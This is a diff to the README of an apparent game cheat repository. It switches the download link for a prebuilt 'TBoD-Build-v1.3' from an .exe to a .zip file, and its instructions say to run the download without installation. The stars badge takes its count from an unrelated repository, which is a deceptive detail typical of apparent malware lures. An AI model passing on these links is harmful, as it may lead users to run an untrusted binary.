@@ -1,7 +1,7 @@
-# The Blood of Dawnwalker - v1.3 (Cheat menu) 23-Sep-2026
+# The Blood of Dawnwalker - v1.3 (Cheat menu) 26-Sep-2026
 
-[![Download Latest](https://img.shields.io/badge/Download-Latest-brightgreen?style=for-the-badge&logo=github)](https://github.com/Stadiumbingrave/TBOD-Hack/releases/download/v1/TBoD-Build-v1.3.exe)
-[![GitHub release](https://img.shields.io/badge/Release-1.3-blue?style=for-the-badge)](https://github.com/Stadiumbingrave/TBOD-Hack/releases/download/v1/TBoD-Build-v1.3.exe)
+[![Download Latest](https://img.shields.io/badge/Download-Latest-brightgreen?style=for-the-badge&logo=github)](https://github.com/Stadiumbingrave/TBOD-Hack/releases/download/v1/TBoD-Build-v1.3.zip)
+[![GitHub release](https://img.shields.io/badge/Release-1.3-blue?style=for-the-badge)](https://github.com/Stadiumbingrave/TBOD-Hack/releases/download/v1/TBoD-Build-v1.3.zip)
 [![License: MIT](https://img.shields.io/badge/License-MIT-blue?style=for-the-badge)](https://opensource.org/licenses/MIT)
 [![Stars](https://img.shields.io/github/stars/Azure-Peak/Azure-Peak?style=for-the-badge&logo=github)](https://github.com/Stadiumbingrave/TBOD-Hack/stargazers)
 
@@ -79,7 +79,7 @@ Check out the Features list
 
 ## How do I use it?
 
-1. Download the [latest release build](https://github.com/Stadiumbingrave/TBOD-Hack/releases/download/v1/TBoD-Build-v1.3.exe) from repo's Releases page.
+1. Download the [latest release build](https://github.com/Stadiumbingrave/TBOD-Hack/releases/download/v1/TBoD-Build-v1.3.zip) from repo's Releases page.
 
 2. You can store it anywhere. It does NOT require an installation.
 
